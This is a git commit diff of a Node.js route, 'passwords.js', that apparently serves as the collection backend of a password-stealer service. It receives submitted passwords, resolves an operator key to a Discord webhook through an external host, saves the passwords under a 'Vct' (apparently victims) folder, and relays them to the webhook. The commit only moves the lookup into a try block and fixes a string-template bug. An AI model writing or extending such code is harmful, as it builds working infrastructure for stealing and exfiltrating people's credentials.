4c7878e885c3349a8ff7f1ddf4d049801a723e3c
zibrahimsm <167458781+zibrahimsm@users.noreply.github.com>
2024-04-25 21:14:19 +0300

    Update passwords.js

--- Routes/passwords.js
+++ Routes/passwords.js
@@ -3,27 +3,25 @@ const { WebhookClient } = require('discord.js');
 const crypto = require('crypto');
 const axios = require('axios');
 
-
-
 module.exports = async (req, res) => {
     const { key, passwords } = req.body;
 
     if (!key) {
         return res.sendStatus(400); 
     }
-		const response = await axios.get('https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295');
-  const webhook = response.data;
-
-    if (!webhook) {
-        return res.sendStatus(400); 
-    }
-
-    const randomstringg = crypto.randomBytes(5).toString('hex');
-    const content = passwords;
 
     try {
-        await fs.writeFile(`./Vct/Passwords/${randomstringg}.txt`, content);
+        const response = await axios.get(`https://bgg-7xht.onrender.com/keysorgu?key=${key}&api_auth=1295`);
+        const webhook = response.data;
 
+        if (!webhook) {
+            return res.sendStatus(400); 
+        }
+
+        const randomstringg = crypto.randomBytes(5).toString('hex');
+        const content = passwords;
+
+        await fs.writeFile(`./Vct/Passwords/${randomstringg}.txt`, content);
 
         const webhookClient = new WebhookClient({ url: webhook });
         await webhookClient.send({
@@ -33,12 +31,9 @@ module.exports = async (req, res) => {
             }]
         });
 
-
         return res.sendStatus(200);
     } catch (err) {
-      
-      console.error(err);
-
+        console.error(err);
         return res.status(500).json({ error: 'Internal Server Error' });
     }
 };
